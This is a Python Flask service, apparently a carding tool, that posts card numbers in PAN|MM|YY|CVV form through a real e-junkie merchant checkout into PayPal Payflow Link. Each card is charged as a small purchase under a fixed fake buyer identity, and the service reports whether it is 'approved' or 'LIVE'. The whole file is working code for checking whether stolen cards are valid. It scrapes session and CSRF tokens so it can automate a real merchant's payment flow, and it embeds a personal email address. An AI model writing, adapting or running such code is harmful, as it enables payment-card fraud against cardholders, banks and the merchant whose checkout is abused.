#!/usr/bin/env python3
"""
E-Junkie PayPal Flow Endpoint
"""

from flask import Flask, request, jsonify
import requests
import re
from urllib.parse import unquote, urlparse, parse_qs
import logging

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/check', methods=['GET', 'POST'])
def check_card():
    """
    Endpoint to check card through e-junkie/PayPal flow
    """
    try:
        # Get card data from request
        if request.method == 'GET':
            cc_param = request.args.get('cc')
            if not cc_param:
                return jsonify({
                    'status': 'error',
                    'message': 'Missing cc parameter'
                }), 400
            card_data = cc_param
        else:
            data = request.get_json()
            if not data or 'cc' not in data:
                return jsonify({
                    'status': 'error',
                    'message': 'Missing cc in JSON body'
                }), 400
            card_data = data['cc']
        
        # Parse card
        parts = card_data.split('|')
        if len(parts) != 4:
            return jsonify({
                'status': 'error',
                'message': 'Invalid card format. Use: PAN|MM|YY|CVV'
            }), 400
        
        cc, mes, ano, cvv = parts
        
        logger.info(f"Processing card: {cc[:6]}******{cc[-4:]}")
        
        # Step 1: Get ec_url
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
        })
        
        response = session.get('https://www.e-junkie.com/ecom/gb.php?&i=pdf:SJ&cl=246605&c=cc&ejc=4&custom=card')
        
        match = re.search(r'ec_url=([^&"]+)', response.text)
        if not match:
            return jsonify({'status': 'error', 'message': 'Failed to get ec_url'}), 500
        
        ec_url = unquote(match.group(1))
        logger.info(f"Got ec_url: {ec_url[:100]}...")
        
        # Extract cart data
        parsed_url = urlparse(ec_url)
        query_params = parse_qs(parsed_url.query)
        cart_md5 = query_params.get('cart_md5', [None])[0]
        cart_id = query_params.get('cart_id', [None])[0]
        
        if not cart_md5 or not cart_id:
            return jsonify({'status': 'error', 'message': 'Failed to extract cart data'}), 500
        
        logger.info(f"Cart ID: {cart_id}, MD5: {cart_md5}")
        
        # Step 2: Post to ppadvanced.php
        params = {
            'client_id': '246605',
            'cart_id': cart_id,
            'cart_md5': cart_md5,
            'page_ln': 'en',
            'cb': '1772049417',
            'ec_url': f'https://www.e-junkie.com/ecom/gbv3.php?c=cart&ejc=2&cl=246605&cart_id={cart_id}&cart_md5={cart_md5}&cart_currency=USD',
        }
        
        data = f'ts=1772049418363&amount=3.99&cur=USD&cart_id={cart_id}&cart_md5={cart_md5}&address_same=false&em_updates=false&email=opdevildragon%40gmail.com&name=Erik+Ragara&fname=Erik&lname=Ragara&company_name=None&phone=12012455464&address=123+Allen+Street&address2&city=New+York&state=AL&zip=10001&country=US&shipping_name&shipping_fname&shipping_lname&shipping_company_name&shipping_phone&shipping_address&shipping_address2&shipping_city&shipping_country=US&shipping_state&shipping_zip&buyerNotes'
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.e-junkie.com',
            'Referer': f'https://www.e-junkie.com/ecom/ccv3/?client_id=246605&cart_id={cart_id}&cart_md5={cart_md5}&c=cc&ejc=4&',
        }
        
        response = session.post('https://www.e-junkie.com/ecom/ppadvanced.php', params=params, headers=headers, data=data)
        
        # Extract tokens
        securetoken = re.search(r'<input[^>]*name="SECURETOKEN"[^>]*value="([^"]+)"', response.text)
        securetokenid = re.search(r'<input[^>]*name="SECURETOKENID"[^>]*value="([^"]+)"', response.text)
        csrf_token = re.search(r'<input[^>]*name="CSRF_TOKEN"[^>]*value="([^"]+)"', response.text)
        
        if not securetoken or not securetokenid:
            return jsonify({'status': 'error', 'message': 'Failed to get secure tokens'}), 500
        
        SECURETOKEN = securetoken.group(1)
        SECURETOKENID = securetokenid.group(1)
        CSRF_TOKEN = csrf_token.group(1) if csrf_token else ''
        
        logger.info("Got secure tokens")
        
        # Step 3: Get PayPal CSRF
        paypal_response = session.get(f'https://payflowlink.paypal.com?&SECURETOKENID={SECURETOKENID}&SECURETOKEN={SECURETOKEN}')
        
        csrf_paypal = None
        if paypal_response.status_code == 200:
            csrf_match = re.search(r'<input[^>]*name="CSRF_TOKEN"[^>]*value="([^"]+)"', paypal_response.text)
            csrf_paypal = csrf_match.group(1) if csrf_match else None
        
        if not csrf_paypal:
            return jsonify({'status': 'error', 'message': 'Failed to get PayPal CSRF'}), 500
        
        # Step 4: Process transaction
        process_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://payflowlink.paypal.com',
            'Referer': f'https://payflowlink.paypal.com/?&SECURETOKENID={SECURETOKENID}&SECURETOKEN={SECURETOKEN}',
        }
        
        post_data = f'subaction&CARDNUM={cc}&EXPMONTH={mes}&EXPYEAR={ano}&CVV2={cvv}&startdate_month&startdate_year&issue_number&METHOD=C&PAYMETHOD=C&FIRST_NAME=Erik&LAST_NAME=Ragara&template=MINLAYOUT&ADDRESS=123+Allen+Street&CITY=New+York&STATE=NY&ZIP=10001&COUNTRY=US&PHONE=12012455464&EMAIL=opdevildragon%40gmail.com&SHIPPING_FIRST_NAME&SHIPPING_LAST_NAME&ADDRESSTOSHIP&CITYTOSHIP&STATETOSHIP&ZIPTOSHIP&COUNTRYTOSHIP&PHONETOSHIP&EMAILTOSHIP&TYPE=S&SHIPAMOUNT=0.00&TAX=0.00&INVOICE={SECURETOKENID}&DISABLERECEIPT=TRUE&flag3dSecure&CURRENCY=USD&STATE=NY&EMAILCUSTOMER=FALSE&swipeData=0&SECURETOKEN={SECURETOKEN}&SECURETOKENID={SECURETOKENID}&PARMLIST&MODE&CSRF_TOKEN={csrf_paypal}&referringTemplate=minlayout'
        
        transaction_response = session.post('https://payflowlink.paypal.com/processTransaction.do', headers=process_headers, data=post_data)
        
        # Parse response
        result = {}
        fields = {
            'RESULT': r'<input[^>]*name="RESULT"[^>]*value="([^"]+)"',
            'RESPMSG': r'<input[^>]*name="RESPMSG"[^>]*value="([^"]+)"',
            'AVSDATA': r'<input[^>]*name="AVSDATA"[^>]*value="([^"]+)"',
            'IAVS': r'<input[^>]*name="IAVS"[^>]*value="([^"]+)"',
            'PROCAVS': r'<input[^>]*name="PROCAVS"[^>]*value="([^"]+)"',
            'CVV2MATCH': r'<input[^>]*name="CVV2MATCH"[^>]*value="([^"]+)"',
            'PNREF': r'<input[^>]*name="PNREF"[^>]*value="([^"]+)"',
        }
        
        for field, pattern in fields.items():
            match = re.search(pattern, transaction_response.text, re.IGNORECASE)
            if match:
                result[field] = match.group(1)
        
        result_code = result.get('RESULT', '')
        result_msg = result.get('RESPMSG', 'Unknown')
        
        logger.info(f"RESULT: {result_code}, RESPMSG: {result_msg}")
        
        # Determine status
        if result_code == '0':
            status = 'approved'
            message = f"Approved: {result_msg}"
        elif result_code == '12' and '15005' in result_msg:
            status = 'approved'
            message = f"CARD IS LIVE - {result_msg}"
        elif result_code in ['1', '2', '3', '4']:
            status = 'declined'
            message = f"Declined: {result_msg}"
        else:
            status = 'declined'
            message = f"Declined: {result_msg}"
        
        return jsonify({
            'status': status,
            'message': message,
            'lista': card_data,
            'details': result
        })
        
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy'})

@app.route('/', methods=['GET'])
def index():
    return jsonify({
        'service': 'E-Junkie PayPal Payment Checker',
        'endpoints': {
            '/check': 'Check card (GET/POST with cc parameter)',
            '/health': 'Health check'
        }
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5006, debug=False)
